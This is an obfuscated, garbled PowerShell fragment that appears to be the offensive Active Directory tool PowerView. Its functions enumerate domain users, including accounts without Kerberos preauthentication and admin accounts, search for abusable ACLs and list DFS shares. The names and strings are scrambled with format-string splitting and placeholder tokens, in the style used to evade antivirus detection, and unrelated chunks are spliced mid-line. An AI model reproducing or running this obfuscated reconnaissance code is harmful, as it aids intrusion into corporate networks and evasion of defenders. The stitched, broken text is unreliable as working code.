            throw (S5z[FS5z+S5ziS5z+S5znd-DomaS5z+S5zinObjectS5z+S5zPS5z+S5zroS5z+S5zpertyOutlierS5z+S5z] S5z+S5zIS5z+S5znvaS5z+S5zlid S5z+S5zclS5z+S5zassS5z+S5z: S5z+Z3bYoVClassNameZ3b)
        }

        ForEach (YoV{OIJKBjEIJKCT} in YoV{obIJKJeIJKCTS}) {
            YoV{obIJKJEctprOpIJKeRTIJKIIJKes} = &(Z3b{3}{1}{0}{2}Z3b -f S5zbS5z,S5zet-MemS5z,S5zerS5z,S5zGS5z) -InputObject YoV{OIJKBJEct} -MemberType (Z3b{0}{2}{1}{3}Z3b -f S5zNotePrS5z,S5ztS5z,S5zoperS5z,S5zyS5z) JGO &(Z3b{3}{4}{2}{1}{0}Z3b-fS5zctS5z,S5zObjeS5z,S5z-S5z,S5zSeS5z,S5zlectS5z) -Expand (Z3b{0}{1}Z3b-fS5zNamS5z,S5zeS5z)
            ForEach(YoV{ObjIJKECtpRoPIJKerIJKTy} in YoV{OBIJKJeIJKcTIJKpRIJKoPerTiIJKeS}) {
                if (YoV{rEIJKFErENCEobJEIJKCIJKTPIJKROIJKPERIJKTIJKies} -NotContains YoV{oBjIJKECtPRIJKoPeIJKRty}) {
                    YoV{oIJKUT} = &(Z3b{0}{1}{2}Z3b -f S5zNewS5z,S5z-ObjecS5z,S5ztS5z) (Z3b{0}{1}Z3b -fS5zPS5z,S5zSObjectS5z)
                    YoV{oIJKUT} JGO &(Z3b{2}{1}{0}Z3b -f S5zrS5z,S5zd-MembeS5z,S5zAdS5z) (Z3b{2}{1}{0}{3}Z3b-fS5zrS5z,S5zpS5z,S5zNoteS5z,S5zopertyS5z) (Z3b{0}{1}{2}Z3b -f S5zSaS5z,S5zmAcS5z,S5zcountNameS5z) YoV{OIJKBJeIJKct}.Z3bSIJKAmAIJKccouNTIJKNAMeZ3b
                    YoV{oIJKUt} JGO &(Z3b{1}{2}{0}Z3b-fS5z-MemberS5z,S5zAdS5z,S5zdS5z) (Z3b{0}{3}{1}{2}Z3b-f S5zNoS5z,S5zproS5z,S5zpertyS5z,S5zteS5z) (Z3b{1}{0}Z3b-fS5zertyS5z,S5zPropS5z) YoV{OBIJKjecIJKTpIJKROPERTY}
                    YoV{OIJKUT} JGO &(Z3b{3}{1}{2}{0}Z3b-fS5zrS5z,S5zMeS5z,S5zmbeS5z,S5zAdd-S5z) (Z3b{3}{2}{1}{0}Z3b-f S5zrtyS5z,S5zpropeS5z,S5zteS5z,S5zNoS5z) (Z3b{1}{0}Z3b -f S5zeS5z,S5zValuS5z) YoV{oIJKBIJKJecT}.YoV{OIJKBIJKjIJKECtPROIJKPeRtY}
                    YoV{oIJKUT}.Z3bpIJKSOIJKBjectZ3b.Z3btyIJKpenAmIJKEsZ3b.(Z3b{2}{1}{0}Z3b -f S5ztS5z,S5znserS5z,S5zIS5z).Invoke(0, (Z3b{6}{5}{0}{2}{7}{3}{4}{1}Z3b -f S5zieS5z,S5zlierS5z,S5zw.ProS5z,S5ztS5z,S5zyOutS5z,S5zowerVS5z,S5zPS5z,S5zperS5z))
                    YoV{OIJKUT}
                }
            }
        }
    }
}








function gEIJKT-DoMAiNUIJKSIJKEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{7}{4}{6}{2}{3}{0}{5}Z3b -f S5zgnS5z,S5zPSUsS5z,S5zreThanAsS5z,S5zsiS5z,S5zDeclaredS5z,S5zmentsS5z,S5zVarsMoS5z,S5zeS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{4}{3}{0}{1}Z3b -fS5zesS5z,S5zsS5z,S5zPS5z,S5zuldProcS5z,S5zSShoS5z}, S5zS5z)]
    [OutputType({Z3b{1}{0}{2}Z3b -f S5zView.S5z,S5zPowerS5z,S5zUserS5z})]
    [OutputType({Z3b{0}{2}{1}{3}Z3b -fS5zPowerVS5z,S5zw.US5z,S5zieS5z,S5zser.RawS5z})]
    [CmdletBinding(DEfaulTpARameTERsetnAme = {Z3b{3}{0}{1}{2}Z3b -f S5zelegaS5z,S5ztS5z,S5zionS5z,S5zAllowDS5z})]
    Param(
        [Parameter(POSitIon = 0, VAlUeFRompipElINe = YoV{TrIJKUE}, valUEfROmpIpelineBYProPErtYnAme = YoV{tIJKRUe})]
        [Alias({Z3b{1}{2}{3}{4}{0}Z3b-fS5zishedNameS5z,S5zDiS5z,S5zstiS5z,S5zngS5z,S5zuS5z}, {Z3b{1}{2}{4}{3}{0}Z3b -fS5zeS5z,S5zSamAS5z,S5zcS5z,S5zountNamS5z,S5zcS5z}, {Z3b{1}{0}Z3b -fS5zameS5z,S5zNS5z}, {Z3b{2}{1}{5}{0}{4}{3}Z3b -f S5zguisS5z,S5ztS5z,S5zMemberDisS5z,S5zdNameS5z,S5zheS5z,S5zinS5z}, {Z3b{2}{1}{0}Z3b-fS5zberNameS5z,S5zmS5z,S5zMeS5z})]
        [String[]]
        YoV{IIJKDEIJKNtITy},

        [Switch]
        YoV{SIJKPN},

        [Switch]
        YoV{ADIJKmiIJKNcIJKOunT},

        [Parameter(PArAmeteRseTnAMe = Z3bALlOwIJKDIJKEIJKleIJKgATIonZ3b)]
        [Switch]
        YoV{aLIJKLowDeLeIJKgaTiIJKoN},

        [Parameter(paRametErSetnaME = Z3bdisIJKAlIJKlowDeleIJKGAtiONZ3b)]
        [Switch]
        YoV{DiSIJKAlIJKlIJKoWDELIJKEgAIJKTiON},

        [Switch]
        YoV{trUSteIJKDIJKToAuIJKTH},

        [Alias({Z3b{4}{1}{7}{5}{3}{6}{0}{2}Z3b-fS5zuiS5z,S5zerbS5z,S5zredS5z,S5zeS5z,S5zKS5z,S5ztRS5z,S5zqS5z,S5zerosPreauthNoS5z}, {Z3b{2}{0}{1}Z3b -f S5zeautS5z,S5zhS5z,S5zNoPrS5z})]
        [Switch]
        YoV{PRIJKeIJKAuThnoIJKTreQIJKUIIJKRed},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{domIJKAIJKIN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b-fS5ziS5z,S5zlterS5z,S5zFS5z})]
        [String]
        YoV{lIJKdIJKApfIlter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{pRIJKopErtIJKiIJKeS},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-f S5zAS5z,S5zDSPathS5z})]
        [String]
        YoV{seARCIJKhBIJKAse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{4}{3}{2}Z3b-fS5zDomainCoS5z,S5znS5z,S5zollerS5z,S5zrS5z,S5ztS5z})]
        [String]
        YoV{sEIJKRIJKVER},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zBasS5z,S5zeS5z}, {Z3b{0}{1}Z3b-f S5zOneLeS5z,S5zvelS5z}, {Z3b{0}{1}Z3b -fS5zSS5z,S5zubtreeS5z})]
        [String]
        YoV{seAIJKRCIJKHIJKScOPe} = (Z3b{0}{1}Z3b-fS5zSuS5z,S5zbtreeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rEIJKSIJKUIJKLIJKTPAgESize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sIJKERVIJKEIJKRTiMeLiMIT},

        [ValidateSet({Z3b{0}{1}Z3b -fS5zDaS5z,S5zclS5z}, {Z3b{1}{0}Z3b-fS5zroupS5z,S5zGS5z}, {Z3b{1}{0}Z3b-fS5zneS5z,S5zNoS5z}, {Z3b{1}{0}Z3b -f S5znerS5z,S5zOwS5z}, {Z3b{0}{1}Z3b -fS5zSS5z,S5zaclS5z})]
        [String]
        YoV{seCIJKUIJKRiIJKTymASks},

        [Switch]
        YoV{toMBIJKsIJKTIJKOne},

        [Alias({Z3b{2}{0}{1}Z3b-f S5zrS5z,S5znOneS5z,S5zRetuS5z})]
        [Switch]
        YoV{fiNIJKdoIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKRIJKeDeIJKNtiaL} =  (  &(Z3b{1}{0}Z3b -f S5zriABLES5z,S5zVAS5z) (Z3bJZ3b+Z3bfiZ3b)  ).Z3bvIJKALUEZ3b::Z3bEmIJKpTyZ3b,

        [Switch]
        YoV{rIJKAw}
    )

    DynamicParam {
        YoV{UaIJKCIJKVAlUIJKenAIJKMeS} =  YoV{4IJKx0}::(Z3b{0}{1}Z3b -fS5zGetNameS5z,S5zsS5z).Invoke(YoV{uIJKAIJKcENum})
        
        YoV{UaIJKCVaLUIJKenamEs} = YoV{uACvaIJKlIJKUENAIJKmEs} JGO &(Z3b{0}{2}{3}{1}{4}Z3b-f S5zForEaS5z,S5zecS5z,S5zch-S5z,S5zObjS5z,S5ztS5z) {YoV{_}; Z3bNOT_YoV_Z3b}
        
        &(Z3b{5}{0}{4}{1}{3}{2}Z3b-f S5zewS5z,S5ziS5z,S5zmeterS5z,S5zcParaS5z,S5z-DynamS5z,S5zNS5z) -Name (Z3b{1}{2}{0}Z3b -f S5zrS5z,S5zUACFS5z,S5zilteS5z) -ValidateSet YoV{uIJKACIJKVIJKAlueNaMIJKEs} -Type ([array])
    }

    BEGIN {
        YoV{sEaIJKRCHEIJKRargumEIJKNIJKTS} = @{}
        if (YoV{pSIJKBIJKouIJKNdPArametIJKErS}[(Z3b{0}{1}Z3b-fS5zDS5z,S5zomainS5z)]) { YoV{SeaIJKRIJKCIJKHerarGuIJKmeIJKNts}[(Z3b{2}{0}{1}Z3b -fS5zoS5z,S5zmainS5z,S5zDS5z)] = YoV{DOIJKmIJKAIN} }
        if (YoV{pIJKsBOuNIJKDPIJKA','rS5z,S5zTES5z,S5zbuS5z,S5zpsS5z,S5zErViS5z,S5zdlLS5z,S5zruNTimS5z,S5ztaTTRIS5z,S5zceS.S5z,S5zimS5z,S5zE.INtERoS5z)  )  ;&(Z3b{1}{0}{2}Z3b-f S5zTS5z,S5zSES5z,S5z-iTeMS5z)  VaRiabLE:Awf  ([tYPe](Z3b{2}{3}{1}{0}{4}Z3b -F S5zUtS5z,S5zibS5z,S5zFlAGsATtS5z,S5zrS5z,S5zES5z) ) ;&(Z3b{0}{1}{2}Z3b -fS5zSETS5z,S5z-itES5z,S5zMS5z)  (Z3bvaRiABZ3b+Z3blE:Z3b+Z3b6R9v2Z3b+Z3b8Z3b)  (  [TYPe](Z3b{1}{5}{2}{3}{4}{0}Z3b-fS5zeS5z,','5zeS5z,S5zNamS5z})]
        [String]
        YoV{IdeIJKNtiIJKTy},

        [Parameter(MANDatorY = YoV{tIJKRUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-f S5zOS5z,S5zwnerS5z})]
        [String]
        YoV{oWNIJKErIJKiIJKDEnTiIJKTY},

        [ValidateNotNullOrEmpty()]
   ','Z3b[(Z3b{3}{0}{1}{2}Z3b-f S5zrofS5z,S5zilepatS5z,S5zhS5z,S5zpS5z)])}}) JGO &(Z3b{1}{3}{2}{0}Z3b -fS5ztS5z,S5zSort-ObjS5z,S5zcS5z,S5zeS5z) -Unique
        }
    }
}


function GEIJKTIJK-dOmIJKAIIJKNDFs','ppressMessageAttribute({Z3b{2}{3}{4}{1}{',')){0S5z+S5z}S5z+S5z
 S5z)  -F[cHaR]39,[cHaR]36+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z ','ErEncIJKeDoMAin}, YoV{iIJKDIJKEntiIJKTYrEFIJKeRencIJKedN}, YoV{iDIJKENTitIJKYrEFEIJKRIJKenIJKCECLass}

                                YoV{iNIJKTeresIJKTIngaIJKCl} = &(Z3b{0}{2}{1}Z3b -fS5zNewS5z,S5zctS5z,S5z-ObjeS5z) (Z3b{1}{0}{2}Z3b-fS5zeS5z,S5zPSObjS5z,S5zctS5z)
                                YoV{INtIJKeIJKRestINgaIJKcl} JGO &(Z3b{1}{0}{2}Z3b -fS5zdd-MembeS5z,S5zAS5z,S5zrS5z) (Z3b{2}{0}{1}Z3b -fS5ztS5z,S5zyS5z,S5zNoteProperS5z) (Z3b{1}{2}{0}Z3b-f S5zectDNS5z,S5zOS5z,S5zbjS5z) YoV{_}.Z3bOBIJKJeIJKCtdnZ3b
                                YoV{IIJKNIJKTereIJKStINGAcL} JGO &(Z3b{2}{1}{0}Z3b-f S5zmberS5z,S5zd-MeS5z,S5zAdS5z) (Z3b{3}{1}{2}{0}Z3b-f S5ztyS5z,S5zProS5z,S5zperS5z,S5zNoteS5z) (Z3b{2}{3}{1}{0}Z3b -fS5zlifierS5z,S5zeQuaS5z,S5zAS5z,S5zcS5z) YoV{_}.Z3baceqIJKUIJKALifIeRZ3b
                                YoV{InTIJKerestinGIJKAIJKCl} JGO &(Z3b{1}{2}{0}Z3b-fS5zmberS5z,S5zAdd-S5z,S5zMeS5z) (Z3b{2}{1}{0}{3}Z3b -f S5zropertS5z,S5ztePS5z,S5zNoS5z,S5zyS5z) (Z3b{3}{0}{5}{1}{4}{2}Z3b -fS5zctiveDS5z,S5zctS5z,S5zsS5z,S5zAS5z,S5zoryRightS5z,S5zireS5z) YoV{_}.Z3baIJKcTivEDiIJKRIJKECTIJKOryrigIJKhIJKTsZ3b
                                if (YoV{_}.Z3bObIJKJECTaIJKcEtYpeZ3b) {
                                    YoV{inteREsIJKTIJKIIJKNgACl} JGO &(Z3b{0}{2}{1}Z3b -f S5zAddS5z,S5zerS5z,S5z-MembS5z) (Z3b{2}{1}{0}Z3b-fS5zePropertyS5z,S5ztS5z,S5zNoS5z) (Z3b{2}{1}{0}Z3b -f S5zpeS5z,S5zyS5z,S5zObjectAceTS5z) YoV{_}.Z3bObIJKJECtacIJKEtyPeZ','   YoV{GIJKPLink},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dOmIJKAiN},

        [ValidateNotNullOr','S5ziS5z+S5znDFSS5z+S5zSharS5z+S5ze] S5z+S5zGet-DomainDFS5z+S5zSSS5z+S5zhareS5z+S5zVS5z+S5z1S5z+S5z S5z+S5zerrorS5z+S5z S5z+S5zinS5z+S5z S5z+S5zparS5z+S5zsinS5z+S5zg S5z+S5zDS5z+S5zFS S5z+S5zshS5z+S5zare S5z+S5z: S5z+Z3bYoV_Z3b)
                            }
                        }
                    }
                    if (YoV{rIJKESIJKULTs}) {
                        try { YoV{rEsIJKUlTs}.(Z3b{0}{1}Z3b -f S5zdisposS5z,S5zeS5z).Invoke() }
                        catch {
                            &(Z3b{0}{1}{2}Z3b-f S5zWrite-VS5z,S5zeS5z,S5zrboseS5z) (S5z[S5z+S5zGet-S5z+S5zDS5z+S5zomainDFSShS5z+S5zare]S5z+S5z S5z+S5zGet-DS5z+S5zomS5z+S5zaiS5z+S5znDFSS5z+S5zShS5z+S5zareV1 S5z','JKATTRIJKIbIJKUTES} = (Z3b{18}{3}{8}{0}{1}{2}{17}{16}{13}{6}{7}{10}{11}{9}{15}{12}{4}{5}{14}Z3b -fS5z
        S5z,S5zClass,S5z,S5z
     S5z,S5zsiS5z,S5z   BeS5z,S5zforeFieldInS5z,S5zlS5z,S5zic,
S5z,S5zClass,S5z,S5z   Sealed,S5z,S5z  S5z,S5z   S5z,S5z    S5z,S5zbS5z,S5zitS5z,S5z
 S5z,S5zPuS5z,S5z   S5z,S5zAnS5z)

    if (YoV{eXIJKPlICiTlAyIJKOUT})
    {
        YoV{sTrUctAIJKTtrIJKiBIJKUTes} = YoV{SIJKTRucTIJKAIJKTTrIBUTES} -bor  (  &(Z3b{1}{0}{2}Z3b-f S5zRiAS5z,S5zVaS5z,S5zBLeS5z)  HPMyz2 ).Z3bvaLIJKUEZ3b::Z3bEIJKXPLICiIJKTLaYIJKOIJKUTZ3b
    }
    else
    {
        YoV{StRIJKUCtIJKAtTRIJKiButES} = YoV{sTrucIJKTIJKAIJKTIJKTriButes} -bor  ( &(Z3b{0}{4}{2}{3}{1}Z3b -fS5zgEt-cS5z,S5zmS5z,S5zLS5z,S5zdITeS5z,S5zHiS5z) vArIABLE:HPmyZ2).Z3bVaLIJKUeZ3b::Z3bSEIJKQUEIJKNTiaIJKlLIJKAyOUtZ3b
    }

    YoV{STrIJKUcTBIJKUIlDIJKER} = YoV{MOIJKdIJKUlE}.Z3bdefiNIJKEtYIJKPEZ3b(YoV{fULlIJKNIJKAME}, YoV{sIJKTRUCTIJKAttrIJKiButIJKes}, [ValueType], YoV{pIJKAcKINIJKGSIZE})
    YoV{CIJKonIJKStRuCtIJKorINFO} =  ( &(Z3b{0}{4}{2}{3}{1}Z3b-f S5zgES5z,S5ztEmS5z,S5zhS5z,S5zIldiS5z,S5zt-CS5z)  (S5zvS5z+S5zARIaBLE:SS5z+S5ztc3S5z)  ).Z3bVIJKALueZ3b.(Z3b{0}{2}{3}{1}Z3b -f S5zGetS5z,S5zsS5z,S5zConstruS5z,S5zctorS5z).Invoke()[0]
    YoV{SIzEIJKCIJKONST} = @(  (  &(Z3b{2}{0}{1}Z3b -f S5zHilDiS5z,S5zTeMS5z,S5zCS5z) (S5zvARiAbLS5z+S5zE:SS5z+S5ztcS5z+S5z3S5z) ).Z3bValIJKUEZ3b.(Z3b{0}{1}{2}Z3b -fS5zGeS5z,S5ztFieS5z,S5zldS5z).Invoke((Z3b{0}{2}{1}Z3b-fS5zSiS5z,S5zstS5z,S5zzeConS5z)))',',S5zmS5z,S5zeS5z,S5zLiS5z)] = YoV{SeIJKRVeIJKRTIMeLiIJKmIT} }
        if (YoV{pSBIJKoIJKUnIJKDpARaMETIJKers}[(Z3b{0}{1}Z3b-f S5zTombstoS5z,S5zneS5z)]) { YoV{USErIJKSeaRIJKchEIJKRIJKARGUMeIJKNTS}[(Z3b{1}{2}{0}Z3b-fS5zeS5z,S5zToS5z,S5zmbstonS5z)] = YoV{toIJKmbIJKstoNe} }
        if (YoV{pSbOUndIJKPaRIJKAmETIJKErs}[(Z3b{1}{0}{2}Z3b -fS5zedentiaS5z,S5zCrS5z,S5zlS5z)]) { YoV{uSIJKErsearIJKcHIJKEIJKRarguIJKmIJKeNts}[(Z3b{0}{1}{2}Z3b -fS5zCS5z,S5zredentiaS5z,S5zlS5z)] = YoV{CRIJKEdEntIJKiIJKAL} }

        if (YoV{PsbIJKOUNIJKDPIJKARaMEtIJKERs}[(Z3b{2}{1}{0}{3}Z3b -f S5zrIdentiS5z,S5zseS5z,S5zUS5z,S5ztyS5z)] -or YoV{psBOUIJKNdPIJKAIJKRamETeRS}[(Z3b{2}{0}{1}{3}Z3b -f S5zPFilS5z,S5ztS5z,S5zUserLDAS5z,S5zerS5z)] -or YoV{pSIJKBIJKoIJKUndpARAmEIJKTERs}[(Z3b{1}{2}{0}{3}Z3b -f S5zBS5z,S5zUseS5z,S5zrSearchS5z,S5zaseS5z)] -or YoV{PsBOuIJKNIJKdPaIJKRaIJKMeIJKTERs}[(Z3b{0}{2}{3}{1}Z3b-f S5zUserS5z,S5zountS5z,S5zAdmS5z,S5zinCS5z)]) {
            YoV{TaIJKRGEIJKTUsErs} = &(Z3b{2}{1}{3}{0}Z3b-f S5zerS5z,S5z-DS5z,S5zGetS5z,S5zomainUsS5z) @UserSearcherArguments JGO &(Z3b{2}{0}{1}Z3b-fS5z-ObS5z,S5zjectS5z,S5zSelectS5z) -ExpandProperty (Z3b{1}{0}{2}Z3b-fS5zamacS5z,S5zsS5z,S5zcountnameS5z)
        }
        elseif (YoV{psBoUnIJKDIJKpAIJKRaMETerS}[(Z3b{3}{1}{0}{2}Z3b-fS5zrouS5z,S5zGS5z,S5zpIdentityS5z,S5zUserS5z)] -or (-not YoV{pSBOIJKUnDpaIJKRAmEIJKTIJKeRs}[(Z3b{1}{0}{2}Z3b -f S5zteS5z,S5zFilS5z,S5zrS5z)])) {
            
            YoV{GrIJKoupsearIJKCIJKHerArGuIJKMenTs} = @{
                (Z3b{0}{1}Z3b-f S5zIdentitS5z,S5zyS5z) = YoV{USERgIJKRouIJKpIIJKDEnTITy}
                (Z3b{0}{1}Z3b -f S5zRS5z,S5zecurseS5z) = YoV{tIJKRue}
            }
            &(Z3b{3}{4}{2}{0}{1}Z3b -fS5ze-VS5z,S5zerboseS5z,S5ztS5z,S5zWrS5z,S5ziS5z) (S5zUsS5z+S5zerGrS5z+S5zoS5z+S5zuS5z+S5zpIdentitS5z+S5zy: S5z+Z3bYoVUserGroupIdentityZ3b)
            if (YoV{PsBOIJKUIJKNdIJKPaRAmIJKeteIJKRs}[(Z3b{2}{1}{0}Z3b-fS5zomainS5z,S5zrDS5z,S5zUseS5z)]) { YoV{grOIJKUpsEIJKARCHeIJKRIJKARGUmENIJKTS}[(Z3b{0}{1}Z3b-f S5zDomaiS5z,S5znS5z)] = YoV{usErIJKdIJKOMAIN} }
            if (YoV{psbIJKOuIJKNIJKdpARamIJKEteRs}[(Z3b{0}{1}{2}Z3b-fS5zUsS5z,S5zerSeaS5z,S5zrchBaseS5z)]) { YoV{GROUPSEaRcheRArIJKgIJKUIJKmeIJKNIJKTs}[(Z3b{1}{3}{2}{0}Z3b -fS5zaseS5z,S5zSeaS5z,S5zBS5z,S5zrchS5z)] = YoV{UsEIJKRsEArIJKchbaIJ','E} = YoV{idENTityIJKIIJKNIJKstaIJKNce}.(Z3b{1}{0}Z3b-fS5zlitS5z,S5zSpS5z).Invoke(S5z5rjS5z)[1]
                            YoV{IdentiTIJKYfIltIJKEr} += Z3b(samAccountName=YoVGroupName)Z3b
                            YoV{SeARIJKCIJKhErARguIJKmIJKEnTs}[(Z3b{1}{0}Z3b-fS5zinS5z,S5zDomaS5z)] = YoV{gRoIJKUPIJKDoM','5z).Invoke(0, (Z3b{4}{2}{0}{3}{1}Z3b -f S5zGrS5z,S5zpS5z,S5z.S5z,S5zouS5z,S5zPowerViewS5z))
                                YoV{GRoIJKUp}
                            }
                        }
                    }
                }
            }
            else {
                YoV{iDentIIJKTyfiIJKlIJKTIJKER} = S5zS5z
                YoV{fILIJKTEr} = S5zS5z
                YoV{idIJKentIJKItY} JGO &(Z3b{3}{1}{0}{2}Z3b-fS5zjecS5z,S5ze-ObS5z,S5ztS5z,S5zWherS5z) {YoV{_}} JGO &(Z3b{2}{0}{1}Z3b-f S5zEach-ObjS5z,S5zectS5z,S5zForS5z) {
                    YoV{IdEIJKNtIJKiTyINIJKStaIJKNIJKcE} = YoV{_}.(Z3b{1}{2}{0}Z3b -fS5zplaceS5z,S5zRS5z,S5zeS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{2}{1}{0}Z3b -f S5zlaceS5z,S5zepS5z,S5zRS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                    if (YoV{IdeIJKNTItYIJKiNStIJKAIJKNce} -match (Z3b{0}{1}Z3b -f S5z^S5z,S5zS-1-S5z)) {
                        YoV{IIJKDenTiIJKTyfiLIJKTeR} += Z3b(objectsid=YoVIdentityInstance)Z3b
                    }
                    elseif (YoV{idEnIJKTitIJKyInIJKSTanCe} -match (Z3b{1}{0}Z3b-fS5z=S5z,S5z^CNS5z)) {
                        YoV{IdIJKeNIJKTIJKITYFilTIJKer} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                        if ((-not YoV{pIJKsBoUndpIJKAIJKRAMEtEIJKRS}[(Z3b{2}{1}{0}Z3b -f S5zinS5z,S5zaS5z,S5zDomS5z)]) -and (-not YoV{pSIJKBIJKOuIJKNDparIJKAmeTEIJKRS}[(Z3b{1}{2}{0}Z3b-fS5zaseS5z,S5zSearS5z,S5zchBS5z)])) {
                            
                            
                            YoV{iDIJKENTIIJKTydoma','5z,S5zITS5z) (Z3bVariabLEZ3b+Z3b:6O2Z3b+Z3bzZ3b+Z3blZ3b+Z3bPZ3b)  ).Z3bvaLIJKUEZ3b::Z3buIJKNICIJKODeZ3b.Z3bgeIJKTIJKsTIJKRiNGZ3b(YoV{DFs_TIJKAIJKRgEtlisT_BlIJKOb}[YoV{sIJKeRVEIJKR_Name_SIJKTart}..YoV{sIJKeRIJKVIJKeR_nAMe_eIJKND}])

                            YoV{sHarE_NamEIJK_sIJKIzE_sIJKTIJKArt} = YoV{SIJKEIJKRveR_IJKNAmeIJK_eND} + 1
                            YoV{SHaRE_IJKNamE_sIIJKZIJKeIJK_EIJKND} = YoV{SHIJKAREIJK_nIJKAIJKmeIJK_sIzE_sTARt} + 1
                            YoV{SIJKHAIJKRe_nAme_SIJKiIJKzE} =  YoV{aIJKEpIJKsi}::Z3btOUiNIJKTIJK16Z3b(YoV{dfs_IJKTAIJKRgIJKETLIJKIIJKstIJK_BLoB}[YoV{SIJKHaReIJK_nAmE_SiIJKZIJKE_StART}..YoV{sharEIJK_nIJKAMIJKe_SIIJKze_IJKEnd}],0)
                            YoV{SHIJKAIJKReIJK_nIJKAME_StARt} = YoV{SIJKHARE_NamIJKE_IJKSIIJKZE_end} + 1
                            YoV{SIJKhARE_IJKNaMe_IJKENd} = YoV{sIJKhaREIJK_nAMeIJK_IJKstARt} + YoV{SIJKhaIJKRe_NAmIJKeIJK_sIZE} - 1
                            YoV{shaRE_IJKNAIJKME} =  YoV{6o2zIJKLP}::Z3buIJKNIJKIcOdeZ3b.Z3bgeTstIJKRIIJKNGZ3b(YoV{dFS_taRgETIJKlIJKISt_BlIJKOB}[YoV{shArIJKE_IJKNAMIJKE_stIJKArT}..YoV{sIJKharE_naMeIJK_IJKeND}])

                            YoV{TAIJKRIJKGIJKeT_lIst} += Z3b5rj5rjYoVserver_name5rjYoVshare_nameZ3b
                            YoV{TIJK_oIJKFFSET} = YoV{SIJKHARIJKE_nIJKAmE_eND} + 1
                        }
                    }
                }
                YoV{oIJKFFSIJKET} = YoV{BIJKloIJKBIJK_dAta_eND} + 1
                YoV{DFSIJK_IJKpkt_IJKPRoPERtIEs} = @{
                    (Z3b{0}{1}Z3b-f S5zNS5z,S5zameS5z) = YoV{BloIJKBIJK_Name}
                    (Z3b{1}{0}Z3b-fS5zxS5z,S5zPrefiS5z) = YoV{PIJKRIJKEfix}
                    (Z3b{0}{2}{1}Z3b -fS5zTS5z,S5ztListS5z,S5zargeS','
                    if ((-not YoV{PSBIJKOUndpaIJKRIJKAMeIJKTEIJKRS}[(Z3b{1}{0}Z3b -f S5zmainS5z,S5zDoS5z)]) -and (-not YoV{PIJKsBOuNIJKdpaIJKRAMetEIJKRS}[(Z3b{1}{0}{2}Z3b -f S5zarchBasS5z,S5zSeS5z,S5zeS5z)])) {
                        
                        
                        YoV{idEnTiTYdoIJKMIJKAIN} = YoV{iIJKdIJKEnTITYIIJKNsTAnCE}.(Z3b{2}{1}{0}Z3b-fS5zringS5z,S5zbStS5z,S5zSuS5z).Invoke(YoV{ideIJKNtITIJKyiIJKNsTIJKAnCE}.(Z3b{0}{1}Z3b -f S5zIndexOS5z,S5zfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        &(Z3b{1}{0}{2}{3}Z3b-fS5zite-VerS5z,S5zWrS5z,S5zbosS5z,S5zeS5z) (S5z[GeS5z+S5ztS5z+S5z-S5z+S5zDomainCompuS5z+S5zter] S5z+S5zExtractS5z+S5zedS5z+S5z S5z+S5zdomainS5z+S5z S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfromS5z+S5z S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{SeIJKArCIJKHIJKeRaRguMeIJKNIJKTs}[(Z3b{1}{0}Z3b -fS5zomainS5z,S5zDS5z)] = YoV{iDIJKeNtiTIJKydOmIJKAIN}
                        YoV{cIJKOmIJKPsIJKEaRcIJKHER} = &(Z3b{2}{5}{4}{1}{0}{3}Z3b -fS5zrS5z,S5znSeaS5z,S5zGetS5z,S5zcherS5z,','Add-MS5z) (Z3b{2}{1}{0}Z3b-fS5zrtyS5z,S5ztePropeS5z,S5zNoS5z) (Z3b{4}{3}{2}{0}{1}Z3b -fS5zoryRigS5z,S5zhtsS5z,S5zirectS5z,S5ztiveDS5z,S5zAcS5z) ( (&(Z3b{0}{2}{1}Z3b -fS5zvS5z,S5zbLeS5z,S5zaRiAS5z)  4x0  -vAlUeo  )::Z3bTOoIJKBIJKJectZ3b([System.DirectoryServices.ActiveDirectoryRights], YoV{_}.Z3baCIJKCessMIJKAsKZ3b))
                            if (YoV{gUIJKIDs}) {
                                
                                YoV{AcIJKlIJKPIJKRIJKOpeRtIES} = @{}
                                YoV{_}.Z3bPsOIJKBJecTZ3b.Z3bPRIJKOPIJKErIJKTIeSZ3b JGO &(Z3b{2}{1}{3}{4}{0}Z3b-f S5ztS5z,S5zorEach-S5z,S5zFS5z,S5zObjeS5z,S5zcS5z) {
